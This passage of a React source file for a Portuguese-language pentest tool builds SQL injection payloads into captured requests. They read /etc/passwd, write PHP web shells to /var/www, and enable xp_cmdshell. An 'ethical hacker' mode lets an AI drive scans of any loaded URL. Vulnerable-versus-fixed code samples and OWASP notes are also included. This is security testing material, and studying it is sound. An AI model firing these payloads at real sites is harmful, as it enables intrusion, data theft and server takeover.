                            const payload = "'; SELECT column_name FROM information_schema.columns WHERE table_name='usuarios'--"
                            let newUrl = selectedRequest.url
                            let newBody = selectedRequest.body || ''
                            if (newUrl.includes('?')) {
                              newUrl = newUrl.replace(/([?&])([^=]+)=([^&]*)/g, `$1$2=$3${encodeURIComponent(payload)}`)
                            }
                            if (newBody.includes('=')) {
                              newBody = newBody.replace(/([^&=]+)=([^&]*)/g, `$1=$2${payload}`)
                            }
                            setReplayUrl(newUrl)
                            setReplayBody(newBody)
                            setReplayMethod(selectedRequest.method)
                            setReplayHeaders(formatHeaders(selectedRequest.headers))
                            setActiveTab('history')
                          }}
                          disabled={!selectedRequest}
                          className="px-2 py-1 bg-green-500/10 text-green-400 rounded text-[10px] hover:bg-green-500/20 disabled:opacity-50 disabled:cursor-not-allowed"
                        >
                          Testar
                        </button>
                      </div>
                      <div className="space-y-1">
                        <div className="flex items-center gap-2">
                          <code className="text-[10px] bg-nova-bg px-1.5 py-0.5 rounded flex-1 truncate">'; SELECT column_name FROM information_schema.columns WHERE table_name='usuarios'--</code>
                          <button onClick={() => navigator.clipboard.writeText("'; SELECT column_name FROM information_schema.columns WHERE table_name='usuarios'--")} className="text-nova-text-muted hover:text-nova-accent shrink-0"><Copy size={10} /></button>
                        </div>
                      </div>
                    </div>

                    <div className="bg-[#0a0f0d] border border-nova-border rounded p-3">
                      <div className="flex items-center justify-between mb-2">
                        <span className="text-xs font-medium text-nova-text-secondary">Oracle - Colunas</span>
                        <button 
                          onClick={() => {
                            if (!selectedRequest) return
                            const payload = "' UNION SELECT column_name,2,3 FROM user_tab_columns WHERE table_name='USUARIOS'--"
                            let newUrl = selectedRequest.url
                            let newBody = selectedRequest.body || ''
                            if (newUrl.includes('?')) {
                              newUrl = newUrl.replace(/([?&])([^=]+)=([^&]*)/g, `$1$2=$3${encodeURIComponent(payload)}`)
                            }
                            if (newBody.includes('=')) {
                              newBody = newBody.replace(/([^&=]+)=([^&]*)/g, `$1=$2${payload}`)
                            }
                            setReplayUrl(newUrl)
                            setReplayBody(newBody)
                            setReplayMethod(selectedRequest.method)
                            setReplayHeaders(formatHeaders(selectedRequest.headers))
                            setActiveTab('history')
                          }}
                          disabled={!selectedRequest}
                          className="px-2 py-1 bg-green-500/10 text-green-400 rounded text-[10px] hover:bg-green-500/20 disabled:opacity-50 disabled:cursor-not-allowed"
                        >
                          Testar
                        </button>
                      </div>
                      <div className="space-y-1">
                        <div className="flex items-center gap-2">
                          <code className="text-[10px] bg-nova-bg px-1.5 py-0.5 rounded flex-1 truncate">' UNION SELECT column_name,2,3 FROM user_tab_columns WHERE table_name='USUARIOS'--</code>
                          <button onClick={() => navigator.clipboard.writeText("' UNION SELECT column_name,2,3 FROM user_tab_columns WHERE table_name='USUARIOS'--")} className="text-nova-text-muted hover:text-nova-accent shrink-0"><Copy size={10} /></button>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>

                {/* Card 5: Ataques Avançados */}
                <div className="bg-[#131d1a] border border-nova-border rounded-lg p-4">
                  <h4 className="font-semibold text-nova-text mb-3 flex items-center gap-2">
                    <span className="w-2 h-2 rounded-full bg-red-500" />
                    Fase 5: Ataques Avançados (Leitura/Escrita/Sistema)
                  </h4>
                  <div className="grid grid-cols-1 md:grid-cols-2 gap-3">
                    <div className="bg-[#0a0f0d] border border-nova-border rounded p-3">
                      <div className="flex items-center justify-between mb-2">
                        <span className="text-xs font-medium text-nova-text-secondary">MySQL - Ler Arquivos</span>
                        <button 
                          onClick={() => {
                            if (!selectedRequest) return
                            const payload = "' UNION SELECT LOAD_FILE('/etc/passwd'),2,3-- -"
                            let newUrl = selectedRequest.url
                            let newBody = selectedRequest.body || ''
                            if (newUrl.includes('?')) {
                              newUrl = newUrl.replace(/([?&])([^=]+)=([^&]*)/g, `$1$2=$3${encodeURIComponent(payload)}`)
                            }
                            if (newBody.includes('=')) {
                              newBody = newBody.replace(/([^&=]+)=([^&]*)/g, `$1=$2${payload}`)
                            }
                            setReplayUrl(newUrl)
                            setReplayBody(newBody)
                            setReplayMethod(selectedRequest.method)
                            setReplayHeaders(formatHeaders(selectedRequest.headers))
                            setActiveTab('history')
                          }}
                          disabled={!selectedRequest}
                          className="px-2 py-1 bg-red-500/10 text-red-400 rounded text-[10px] hover:bg-red-500/20 disabled:opacity-50 disabled:cursor-not-allowed"
                        >
                          Testar
                        </button>
                      </div>
                      <div className="space-y-1">
                        <div className="flex items-center gap-2">
                          <code className="text-[10px] bg-nova-bg px-1.5 py-0.5 rounded flex-1 truncate">' UNION SELECT LOAD_FILE('/etc/passwd'),2,3-- -</code>
                          <button onClick={() => navigator.clipboard.writeText("' UNION SELECT LOAD_FILE('/etc/passwd'),2,3-- -")} className="text-nova-text-muted hover:text-nova-accent shrink-0"><Copy size={10} /></button>
                        </div>
                        <div className="flex items-center gap-2 mt-1">
                          <code className="text-[10px] bg-nova-bg px-1.5 py-0.5 rounded flex-1 truncate">' UNION SELECT '&lt;?php system($_GET[0]); ?&gt;' INTO OUTFILE '/var/www/shell.php'-- -</code>
                          <button onClick={() => navigator.clipboard.writeText("' UNION SELECT '<?php system($_GET[0]); ?>' INTO OUTFILE '/var/www/shell.php'-- -")} className="text-nova-text-muted hover:text-nova-accent shrink-0"><Copy size={10} /></button>
                        </div>
                      </div>
                    </div>

                    <div className="bg-[#0a0f0d] border border-nova-border rounded p-3">
                      <div className="flex items-center justify-between mb-2">
                        <span className="text-xs font-medium text-nova-text-secondary">SQL Server - RCE</span>
                        <button 
                          onClick={() => {
                            if (!selectedRequest) return
                            const payload = "'; EXEC xp_cmdshell 'dir C:\\'--"
                            let newUrl = selectedRequest.url
                            let newBody = selectedRequest.body || ''
                            if (newUrl.includes('?')) {
                              newUrl = newUrl.replace(/([?&])([^=]+)=([^&]*)/g, `$1$2=$3${encodeURIComponent(payload)}`)
                            }
                            if (newBody.includes('=')) {
                              newBody = newBody.replace(/([^&=]+)=([^&]*)/g, `$1=$2${payload}`)
                            }
                            setReplayUrl(newUrl)
                            setReplayBody(newBody)
                            setReplayMethod(selectedRequest.method)
                            setReplayHeaders(formatHeaders(selectedRequest.headers))
                            setActiveTab('history')
                          }}
                          disabled={!selectedRequest}
                          className="px-2 py-1 bg-red-500/10 text-red-400 rounded text-[10px] hover:bg-red-500/20 disabled:opacity-50 disabled:cursor-not-allowed"
                        >
                          Testar
                        </button>
                      </div>
                      <div className="space-y-1">
                        <div className="flex items-center gap-2">
                          <code className="text-[10px] bg-nova-bg px-1.5 py-0.5 rounded flex-1 truncate">'; EXEC xp_cmdshell 'dir C:\'--</code>
                          <button onClick={() => navigator.clipboard.writeText("'; EXEC xp_cmdshell 'dir C:\\'--")} className="text-nova-text-muted hover:text-nova-accent shrink-0"><Copy size={10} /></button>
                        </div>
                        <div className="flex items-center gap-2 mt-1">
                          <code className="text-[10px] bg-nova-bg px-1.5 py-0.5 rounded flex-1 truncate">'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE--</code>
                          <button onClick={() => navigator.clipboard.writeText("'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE--")} className="text-nova-text-muted hover:text-nova-accent shrink-0"><Copy size={10} /></button>
                        </div>
                      </div>
                    </div>

                    <div className="bg-[#0a0f0d] border border-nova-border rounded p-3">
                      <div className="flex items-center justify-between mb-2">
                        <span className="text-xs font-medium text-nova-text-secondary">PostgreSQL - Ler/Gravar</span>
                        <button 
                          onClick={() => {
                            if (!selectedRequest) return
                            const payload = "' UNION SELECT pg_read_file('/etc/passwd'),2,3--"
                            let newUrl = selectedRequest.url
                            let newBody = selectedRequest.body || ''
                            if (newUrl.includes('?')) {
                              newUrl = newUrl.replace(/([?&])([^=]+)=([^&]*)/g, `$1$2=$3${encodeURIComponent(payload)}`)
                            }
                            if (newBody.includes('=')) {
                              newBody = newBody.replace(/([^&=]+)=([^&]*)/g, `$1=$2${payload}`)
                            }
                            setReplayUrl(newUrl)
                            setReplayBody(newBody)
                            setReplayMethod(selectedRequest.method)
                            setReplayHeaders(formatHeaders(selectedRequest.headers))
                            setActiveTab('history')
                          }}
                          disabled={!selectedRequest}
                          className="px-2 py-1 bg-red-500/10 text-red-400 rounded text-[10px] hover:bg-red-500/20 disabled:opacity-50 disabled:cursor-not-allowed"
                        >
                          Testar
                        </button>
                      </div>
                      <div className="space-y-1">
                        <div className="flex items-center gap-2">
                          <code className="text-[10px] bg-nova-bg px-1.5 py-0.5 rounded flex-1 truncate">' UNION SELECT pg_read_file('/etc/passwd'),2,3--</code>
                          <button onClick={() => navigator.clipboard.writeText("' UNION SELECT pg_read_file('/etc/passwd'),2,3--")} className="text-nova-text-muted hover:text-nova-accent shrink-0"><Copy size={10} /></button>
                        </div>
                        <div className="flex items-center gap-2 mt-1">
                          <code className="text-[10px] bg-nova-bg px-1.5 py-0.5 rounded flex-1 truncate">COPY (SELECT '&lt;?php system($_GET[0]); ?&gt;') TO '/var/www/shell.php'</code>
                          <button onClick={() => navigator.clipboard.writeText("COPY (SELECT '<?php system($_GET[0]); ?>') TO '/var/www/shell.php'")} className="text-nova-text-muted hover:text-nova-accent shrink-0"><Copy size={10} /></button>
                        </div>
                      </div>
                    </div>

                    <div className="bg-[#0a0f0d] border border-nova-border rounded p-3">
                      <div className="flex items-center justify-between mb-2">
                        <span className="text-xs font-medium text-nova-text-secondary">Oracle - Sistemas</span>
                        <button 
                          onClick={() => {
                            if (!selectedRequest) return
                            const payload = "' UNION SELECT name,value,2 FROM v$parameter WHERE name='utl_file_dir'--"
                            let newUrl = selectedRequest.url
                            let newBody = selectedRequest.body || ''
                            if (newUrl.includes('?')) {
                              newUrl = newUrl.replace(/([?&])([^=]+)=([^&]*)/g, `$1$2=$3${encodeURIComponent(payload)}`)
                            }
                            if (newBody.includes('=')) {
                              newBody = newBody.replace(/([^&=]+)=([^&]*)/g, `$1=$2${payload}`)
                            }
                            setReplayUrl(newUrl)
                            setReplayBody(newBody)
                            setReplayMethod(selectedRequest.method)
                            setReplayHeaders(formatHeaders(selectedRequest.headers))
                            setActiveTab('history')
                          }}
                          disabled={!selectedRequest}
                          className="px-2 py-1 bg-red-500/10 text-red-400 rounded text-[10px] hover:bg-red-500/20 disabled:opacity-50 disabled:cursor-not-allowed"
                        >
                          Testar
                        </button>
                      </div>
                      <div className="space-y-1">
                        <div className="flex items-center gap-2">
                          <code className="text-[10px] bg-nova-bg px-1.5 py-0.5 rounded flex-1 truncate">' UNION SELECT name,value,2 FROM v$parameter WHERE name='utl_file_dir'--</code>
                          <button onClick={() => navigator.clipboard.writeText("' UNION SELECT name,value,2 FROM v$parameter WHERE name='utl_file_dir'--")} className="text-nova-text-muted hover:text-nova-accent shrink-0"><Copy size={10} /></button>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>

              </div>
            </section>

            <section className="border border-nova-border rounded-lg bg-nova-bg-secondary">
              <div className="p-4 space-y-3">
                <div className="bg-[#131d1a] border border-red-500/30 rounded-lg p-3">
                  <h4 className="font-semibold text-red-400 mb-2">❌ Código Vulnerável (Node.js)</h4>
                  <pre className="bg-[#0a0f0d] p-2 rounded text-[11px] font-mono text-nova-text overflow-auto">
{`// ❌ RUIM: Concatenação direta (SQL Injection!)
app.get('/usuario/:id', (req, res) => {
  const id = req.params.id;
  // ISSO É MUITO PERIGOSO!
  const query = 'SELECT * FROM usuarios WHERE id = ' + id;
  db.query(query, (err, results) => {
    if (err) throw err;
    res.send(results);
  });
});`}
                  </pre>
                </div>

                <div className="bg-[#131d1a] border border-green-500/30 rounded-lg p-3">
                  <h4 className="font-semibold text-green-400 mb-2">✅ Código Corrigido (Prepared Statement)</h4>
                  <pre className="bg-[#0a0f0d] p-2 rounded text-[11px] font-mono text-nova-text overflow-auto">
{`// ✅ BOM: Prepared Statement (seguro!)
app.get('/usuario/:id', (req, res) => {
  const id = req.params.id;
  // Usando placeholders ?
  const query = 'SELECT * FROM usuarios WHERE id = ?';
  db.query(query, [id], (err, results) => {
    if (err) throw err;
    res.send(results);
  });
});

// Ou com ORM (mais seguro!)
app.get('/usuario/:id', async (req, res) => {
  const usuario = await Usuario.findByPk(req.params.id);
  res.send(usuario);
});`}
                  </pre>
                </div>

                <div className="bg-[#131d1a] border border-green-500/30 rounded-lg p-3">
                  <h4 className="font-semibold text-green-400 mb-2">✅ Código Corrigido (Python/Flask)</h4>
                  <pre className="bg-[#0a0f0d] p-2 rounded text-[11px] font-mono text-nova-text overflow-auto">
{`# ❌ RUIM
@app.route('/usuario')
def usuario():
    id = request.args.get('id')
    query = f"SELECT * FROM usuarios WHERE id = {id}"  # Vulnerável!
    cursor.execute(query)

# ✅ BOM
@app.route('/usuario')
def usuario():
    id = request.args.get('id')
    query = "SELECT * FROM usuarios WHERE id = %s"  # Placeholder
    cursor.execute(query, (id,))  # Parâmetro separado

# ✅ BOM com SQLAlchemy (ORM)
@app.route('/usuario')
def usuario():
    id = request.args.get('id')
    usuario = Usuario.query.get(id)  # Totalmente seguro!`}
                  </pre>
                </div>
              </div>
            </section>

            <section className="border border-nova-border rounded-lg bg-nova-bg-secondary">
              <div className="px-4 py-2 border-b border-nova-border bg-nova-bg-secondary/50">
                <h3 className="font-semibold flex items-center gap-2 text-nova-accent">
                  <Database size={14} />
                  OWASP Top 10 - SQL Injection
                </h3>
              </div>
              <div className="p-4">
                <ul className="text-[11px] text-nova-text-secondary space-y-2">
                  <li className="flex items-start gap-2">
                    <span className="text-nova-accent">🔒</span>
                    <div><strong className="text-nova-text">A03:2021 - Injection:</strong> SQL Injection está entre as vulnerabilidades mais críticas do OWASP Top 10.</div>
                  </li>
                  <li className="flex items-start gap-2">
                    <span className="text-nova-accent">📊</span>
                    <div><strong className="text-nova-text">Impacto:</strong> Exfiltração de dados, exclusão/modificação de registros, takeover do servidor (se o usuário do banco for privilegiado).</div>
                  </li>
                  <li className="flex items-start gap-2">
                    <span className="text-nova-accent">🛡️</span>
                    <div><strong className="text-nova-text">Defesa Principal:</strong> Prepared Statements (queries parametrizadas) é a única forma verdadeiramente segura.</div>
                  </li>
                </ul>
              </div>
            </section>
          </div>
        </div>

        {/* Auditor Tab */}
        <div className={`${activeTab === 'auditor' ? 'flex' : 'hidden'} flex-1 min-w-0 flex-col`}>
          <div className="h-10 px-3 border-b border-nova-border bg-nova-bg-secondary flex items-center gap-2 shrink-0">
            <Search size={13} className="text-nova-accent" />
            <span className="font-semibold">Auditor de Segurança</span>
            <span className="text-nova-text-muted text-[10px] ml-2">OWASP Top 10 · CVSS v3.1</span>
          </div>
          <AuditReportPanel
            report={auditReport}
            isRunning={isAuditRunning}
            onStartAudit={startAudit}
            targetUrl={currentUrl}
          />
        </div>

        {/* Intercept Tab */}
        <div className={`${activeTab === 'intercept' ? 'flex' : 'hidden'} flex-1 min-w-0 flex-col`}>
          <InterceptorPanel />
        </div>

        {/* PenTest Tab — Split: left controls + right chat */}
        <div className={`${activeTab === 'pentest' ? 'flex' : 'hidden'} flex-1 min-w-0 overflow-hidden`}>
          {/* Coluna Esquerda — Controles e Resultados */}
          <div className="flex-1 min-w-0 flex flex-col overflow-auto">
          <div className="h-10 px-3 border-b border-nova-border bg-nova-bg-secondary flex items-center gap-2 shrink-0">
            <Shield size={13} className="text-nova-accent" />
            <span className="font-semibold">Teste de Penetração</span>
            <div className="ml-auto flex items-center gap-0.5">
              <button
                onClick={() => setPentestSubTab('standard')}
                className={`h-7 px-3 text-[10px] font-medium rounded-t transition-colors ${
                  pentestSubTab === 'standard'
                    ? 'bg-nova-bg text-nova-accent border-b-2 border-nova-accent'
                    : 'text-nova-text-muted hover:text-nova-text'
                }`}
              >
                Pentest
              </button>
              <button
                onClick={() => setPentestSubTab('sqli-advanced')}
                className={`h-7 px-3 text-[10px] font-medium rounded-t transition-colors ${
                  pentestSubTab === 'sqli-advanced'
                    ? 'bg-nova-bg text-red-400 border-b-2 border-red-400'
                    : 'text-nova-text-muted hover:text-nova-text'
                }`}
              >
                <Database size={10} className="inline mr-1" />
                SQLi Avançado
              </button>
            </div>
          </div>
          
          {pentestSubTab === 'sqli-advanced' ? (
            <div className="flex-1 min-h-0">
              <SQLiAdvancedPanel targetUrl={currentUrl && currentUrl !== 'about:blank' ? currentUrl : ''} />
            </div>
          ) : (
          <div className="flex-1 overflow-auto scrollbar-thin p-4 space-y-4">
            {/* Status do alvo */}
            <section className="border border-nova-border rounded-lg bg-nova-bg-secondary p-4">
              <div className="flex items-center gap-3">
                <div className={`w-2.5 h-2.5 rounded-full ${currentUrl && currentUrl !== 'about:blank' ? 'bg-nova-success' : 'bg-nova-text-muted'}`} />
                <div>
                  <div className="text-[11px] text-nova-text-secondary">Alvo</div>
                  <div className="text-sm font-mono text-nova-text truncate max-w-[400px]">{currentUrl !== 'about:blank' ? currentUrl : 'Nenhum site carregado'}</div>
                </div>
              </div>
            </section>

            {/* Hacker Mode Toggle */}
            <section className={`border rounded-lg p-4 transition-all ${
              hackerMode 
                ? 'border-red-500/40 bg-red-500/5' 
                : 'border-nova-border bg-nova-bg-secondary'
            }`}>
              <div className="flex items-center justify-between">
                <div className="flex items-center gap-3">
                  <div className={`w-10 h-10 rounded-lg flex items-center justify-center ${
                    hackerMode ? 'bg-red-500/20' : 'bg-nova-bg'
                  }`}>
                    <Skull size={20} className={hackerMode ? 'text-red-400' : 'text-nova-text-muted'} />
                  </div>
                  <div>
                    <h3 className="text-sm font-semibold text-nova-text flex items-center gap-2">
                      Modo Hacker Ético
                      {hackerMode && (
                        <span className="text-[10px] bg-red-500/20 text-red-400 px-2 py-0.5 rounded-full animate-pulse">
                          ATIVO
                        </span>
                      )}
                    </h3>
                    <p className="text-[10px] text-nova-text-muted">
                      {hackerMode 
                        ? 'IA age como hacker ético. Navegador interno disponível para a IA acessar sites.' 
                        : 'Ative para a IA assumir mentalidade de pentest avançado com navegador integrado.'}
                    </p>
                  </div>
                </div>
                <button
                  onClick={() => {
                    const newMode = !hackerMode
                    setHackerMode(newMode)
                    if (!newMode) {
                      setHackerBrowserUrl('')
                    }
                  }}
                  className={`relative w-12 h-6 rounded-full transition-colors ${
                    hackerMode ? 'bg-red-500' : 'bg-nova-border'
                  }`}
                >
                  <div className={`absolute top-0.5 w-5 h-5 rounded-full bg-white transition-transform ${
                    hackerMode ? 'translate-x-6' : 'translate-x-0.5'
                  }`} />
                </button>
              </div>

              {/* Hacker Browser View */}
              {hackerMode && (
                <div className="mt-3 space-y-2">
                  <div className="flex items-center gap-2">
                    <div className="flex-1 flex items-center gap-2 bg-nova-bg border border-nova-input-border rounded-lg px-2 py-1.5">
                      <GlobeIcon size={12} className="text-nova-text-muted flex-shrink-0" />
                      <input
                        type="text"
                        value={hackerBrowserUrl}
                        onChange={(e) => setHackerBrowserUrl(e.target.value)}
                        onKeyDown={(e) => {
                          if (e.key === 'Enter' && hackerBrowserUrl.trim()) {
                            const url = hackerBrowserUrl.startsWith('http') ? hackerBrowserUrl : `https://${hackerBrowserUrl}`
                            setHackerBrowserUrl(url)
                            setCurrentUrl(url)
                          }
                        }}
                        placeholder="Cole a URL do alvo para o navegador interno da IA..."
                        className="flex-1 bg-transparent text-xs text-nova-text outline-none"
                      />
                      {hackerBrowserUrl && (
                        <button
                          onClick={() => setHackerBrowserUrl('')}
                          className="text-nova-text-muted hover:text-nova-text p-0.5"
                        >
                          <Trash2 size={12} />
                        </button>
                      )}
                    </div>
                    <button
                      onClick={() => {
                        if (hackerBrowserUrl.trim()) {
                          const url = hackerBrowserUrl.startsWith('http') ? hackerBrowserUrl : `https://${hackerBrowserUrl}`
                          setHackerBrowserUrl(url)
                          setCurrentUrl(url)
                        }
                      }}
                      className="px-3 py-1.5 rounded-lg bg-red-500/20 text-red-400 text-xs font-medium hover:bg-red-500/30 transition-colors flex items-center gap-1"
                    >
                      <ExternalLink size={12} />
                      Navegar
                    </button>
                  </div>

                  {/* Browser iframe */}
                  {hackerBrowserUrl && (
                    <div className="border border-nova-border rounded-lg overflow-hidden bg-white" style={{ height: '400px' }}>
                      <div className="h-7 bg-nova-bg-secondary border-b border-nova-border flex items-center px-2 gap-1">
                        <div className="flex gap-1">
                          <div className="w-2.5 h-2.5 rounded-full bg-red-400" />
                          <div className="w-2.5 h-2.5 rounded-full bg-yellow-400" />
                          <div className="w-2.5 h-2.5 rounded-full bg-green-400" />
                        </div>
                        <span className="text-[10px] text-nova-text-muted ml-2 truncate flex-1">{hackerBrowserUrl}</span>
                        <button
                          onClick={() => setHackerBrowserUrl('')}
                          className="text-nova-text-muted hover:text-nova-text p-0.5"
                        >
                          <Trash2 size={12} />
                        </button>
                      </div>
                      <webview
                        ref={hackerBrowserRef as any}
                        src={hackerBrowserUrl}
                        style={{ width: '100%', height: 'calc(400px - 28px)' }}
                        allowpopups="true"
                      />
                    </div>
                  )}

                  {!hackerBrowserUrl && (
                    <div className="border border-dashed border-nova-border rounded-lg p-4 text-center">
                      <Eye size={20} className="text-nova-text-muted mx-auto mb-1 opacity-40" />
                      <p className="text-[10px] text-nova-text-muted">
                        Cole uma URL acima para abrir o navegador interno.<br/>
                        A IA usará este navegador para inspecionar o alvo em tempo real.
                      </p>
                    </div>
                  )}
                </div>
              )}
            </section>

            {/* Botões de teste */}
            <section className="grid grid-cols-2 md:grid-cols-4 gap-3">
              <button
                onClick={() => runPentest('sqli')}
                disabled={pentestRunning || !currentUrl || currentUrl === 'about:blank'}
                className="flex flex-col items-center gap-2 p-4 border border-nova-border rounded-lg bg-nova-bg-secondary hover:bg-nova-hover disabled:opacity-40 disabled:cursor-not-allowed transition-colors"
              >
                <Database size={24} className="text-red-400" />
                <span className="text-[11px] font-semibold text-nova-text text-center">SQL Injection</span>
                <span className="text-[9px] text-nova-text-secondary text-center">Testar injeção SQL</span>
              </button>

              <button
                onClick={() => runPentest('auth-bypass')}
                disabled={pentestRunning || !currentUrl || currentUrl === 'about:blank'}
                className="flex flex-col items-center gap-2 p-4 border border-nova-border rounded-lg bg-nova-bg-secondary hover:bg-nova-hover disabled:opacity-40 disabled:cursor-not-allowed transition-colors"
              >
                <Key size={24} className="text-yellow-400" />
                <span className="text-[11px] font-semibold text-nova-text text-center">Auth Bypass</span>
                <span className="text-[9px] text-nova-text-secondary text-center">Testar credenciais</span>
              </button>

              <button
                onClick={() => runPentest('database-access')}
                disabled={pentestRunning || !currentUrl || currentUrl === 'about:blank'}
                className="flex flex-col items-center gap-2 p-4 border border-nova-border rounded-lg bg-nova-bg-secondary hover:bg-nova-hover disabled:opacity-40 disabled:cursor-not-allowed transition-colors"
              >
                <Server size={24} className="text-orange-400" />
                <span className="text-[11px] font-semibold text-nova-text text-center">Acesso BD</span>
                <span className="text-[9px] text-nova-text-secondary text-center">Buscar dados DB</span>
              </button>

              <button
                onClick={() => runPentest('all')}
                disabled={pentestRunning || !currentUrl || currentUrl === 'about:blank'}
                className="flex flex-col items-center gap-2 p-4 border border-nova-border rounded-lg bg-nova-bg-secondary hover:bg-nova-hover disabled:opacity-40 disabled:cursor-not-allowed transition-colors"
              >
                <Zap size={24} className="text-nova-accent" />
                <span className="text-[11px] font-semibold text-nova-text text-center">Completo</span>
                <span className="text-[9px] text-nova-text-secondary text-center">Todos os testes</span>
              </button>
            </section>

            {/* Botão Testar com IA */}
            <button
              onClick={runPentestWithAI}
              disabled={pentestRunning || !currentUrl || currentUrl === 'about:blank'}
              className="w-full flex items-center justify-center gap-2 p-3 border border-nova-accent/30 rounded-lg bg-nova-accent/10 hover:bg-nova-accent/20 disabled:opacity-40 disabled:cursor-not-allowed transition-colors"
            >
              <Brain size={18} className="text-nova-accent" />
              <span className="font-semibold text-nova-accent">Testar com IA</span>
              <span className="text-[10px] text-nova-text-secondary">(varredura completa)</span>
            </button>

            {/* Progresso */}
            {pentestRunning && (
              <section className="border border-nova-border rounded-lg bg-nova-bg-secondary p-4">
                <div className="flex items-center gap-2 mb-2">
                  <div className="w-3 h-3 border-2 border-nova-accent border-t-transparent rounded-full animate-spin" />
                  <span className="text-[12px] text-nova-text flex-1">{pentestProgress}</span>
                  {pentestFindings.length > 0 && (
                    <span className="text-[10px] text-nova-text-muted bg-nova-bg px-2 py-0.5 rounded-full">
                      {pentestFindings.filter(f => f.severity === 'critical').length > 0 && (
                        <span className="text-red-400 font-bold mr-1">{pentestFindings.filter(f => f.severity === 'critical').length}C</span>
                      )}
                      {pentestFindings.filter(f => f.severity === 'high').length > 0 && (
                        <span className="text-orange-400 font-bold mr-1">{pentestFindings.filter(f => f.severity === 'high').length}H</span>
                      )}
                      {pentestFindings.length} findings
                    </span>
                  )}
                  <button
                    onClick={cancelPentest}
                    className="text-[11px] px-2.5 py-1 rounded-lg border border-red-500/30 text-red-400 hover:bg-red-500/10 transition-colors"
                  >
                    Cancelar
                  </button>
                </div>
                <div className="w-full h-2 bg-nova-bg rounded-full overflow-hidden">
                  <div
                    className="h-full bg-nova-accent rounded-full transition-all duration-500"
                    style={{ width: `${pentestProgressValue}%` }}
                  />
                </div>
              </section>
            )}

            {/* Resultados */}
            {pentestResults && (
              <>
                {/* Summary */}
                <section className="border border-nova-border rounded-lg bg-nova-bg-secondary p-4">
                  <h3 className="font-semibold text-nova-text mb-3 flex items-center gap-2">
                    <Shield size={14} className="text-nova-accent" />
                    Resumo da varredura
                  </h3>
                  <div className="grid grid-cols-5 gap-3 text-center">
                    <div className="bg-nova-bg rounded-lg p-2">
                      <div className="text-2xl font-bold text-nova-text">{pentestResults.findings.length}</div>
                      <div className="text-[9px] text-nova-text-secondary">Total</div>
                    </div>
                    <div className="bg-red-900/20 rounded-lg p-2 border border-red-500/20">
                      <div className="text-2xl font-bold text-red-400">{pentestResults.summary.critical}</div>
                      <div className="text-[9px] text-red-400/70">Críticas</div>
                    </div>
                    <div className="bg-orange-900/20 rounded-lg p-2 border border-orange-500/20">
                      <div className="text-2xl font-bold text-orange-400">{pentestResults.summary.high}</div>
                      <div className="text-[9px] text-orange-400/70">Altas</div>
                    </div>
                    <div className="bg-yellow-900/20 rounded-lg p-2 border border-yellow-500/20">
                      <div className="text-2xl font-bold text-yellow-400">{pentestResults.summary.medium}</div>
                      <div className="text-[9px] text-yellow-400/70">Médias</div>
                    </div>
                    <div className="bg-blue-900/20 rounded-lg p-2 border border-blue-500/20">
                      <div className="text-2xl font-bold text-blue-400">{pentestResults.summary.low}</div>
                      <div className="text-[9px] text-blue-400/70">Baixas</div>
                    </div>
                  </div>
                  <div className="mt-2 text-[10px] text-nova-text-secondary text-center">
                    Duração: {(pentestResults.duration / 1000).toFixed(1)}s
                  </div>
                </section>

                {/* Findings list */}
                <section className="border border-nova-border rounded-lg bg-nova-bg-secondary">
                  <div className="px-4 py-2 border-b border-nova-border flex items-center justify-between">
                    <h3 className="font-semibold text-nova-text flex items-center gap-2">
                      <Bug size={14} />
                      Vulnerabilidades Encontradas
                    </h3>
                    <div className="flex items-center gap-2">
                      <button
                        onClick={generateProfessionalReport}
                        className="px-2 py-1 bg-green-500/10 text-green-400 rounded text-[10px] hover:bg-green-500/20 flex items-center gap-1"
                      >
                        <Download size={10} />
                        Baixar Relatório
                      </button>
                      <button
                        onClick={() => {
                          const text = pentestEngineRef.current?.generateReportText(pentestResults) || ''
                          navigator.clipboard.writeText(text)
                        }}
                        className="px-2 py-1 bg-nova-accent/10 text-nova-accent rounded text-[10px] hover:bg-nova-accent/20"
                      >
                        Copiar Relatório
                      </button>
                    </div>
                  </div>
                  <div className="divide-y divide-nova-border">
                    {pentestResults.findings.length === 0 ? (
                      <div className="p-8 text-center text-nova-text-secondary">
                        <Shield size={32} className="mx-auto mb-2 text-nova-success" />
                        <p className="font-semibold text-nova-text">Nenhuma vulnerabilidade encontrada</p>
                        <p className="text-[11px] mt-1">O site parece estar seguro para os testes realizados.</p>
                      </div>
                    ) : (
                      [...pentestResults.findings]
                        .sort((a, b) => {
                          const order = { critical: 0, high: 1, medium: 2, low: 3 }
                          return order[a.severity] - order[b.severity]
                        })
                        .map((finding, i) => (
                          <div key={i} className="p-4 hover:bg-nova-hover/30">
                            <div className="flex items-start gap-2">
                              <span className={`shrink-0 px-1.5 py-0.5 rounded text-[9px] font-bold ${
                                finding.severity === 'critical' ? 'bg-red-500/20 text-red-400' :
                                finding.severity === 'high' ? 'bg-orange-500/20 text-orange-400' :
                                finding.severity === 'medium' ? 'bg-yellow-500/20 text-yellow-400' :
                                'bg-blue-500/20 text-blue-400'
                              }`}>
                                {finding.severity.toUpperCase()}
                              </span>
                              <div className="flex-1 min-w-0">
                                <h4 className="text-[12px] font-semibold text-nova-text">{finding.title}</h4>
                                <p className="text-[11px] text-nova-text-secondary mt-1">{finding.description}</p>
                                {finding.payload && (
                                  <div className="mt-1 flex items-center gap-2 group/payload">
                                    <code className="text-[10px] bg-[#0a0f0d] px-1.5 py-0.5 rounded text-red-300 break-all flex-1">{finding.payload}</code>
                                    <button
                                      onClick={() => navigator.clipboard.writeText(finding.payload)}
                                      className="shrink-0 opacity-0 group-hover/payload:opacity-100 text-nova-text-muted hover:text-nova-accent transition-opacity"
                                      title="Copiar payload"
                                    >
                                      <Copy size={10} />
                                    </button>
                                  </div>
                                )}
                                <div className="mt-1 flex items-center gap-2 group/endpoint">
                                  <code className="text-[10px] text-nova-text-muted break-all flex-1">{finding.endpoint}</code>
                                  <button
                                    onClick={() => navigator.clipboard.writeText(finding.endpoint)}
                                    className="shrink-0 opacity-0 group-hover/endpoint:opacity-100 text-nova-text-muted hover:text-nova-accent transition-opacity"
                                    title="Copiar endpoint"
                                  >
                                    <Copy size={10} />
                                  </button>
                                </div>
                                <details className="mt-2">
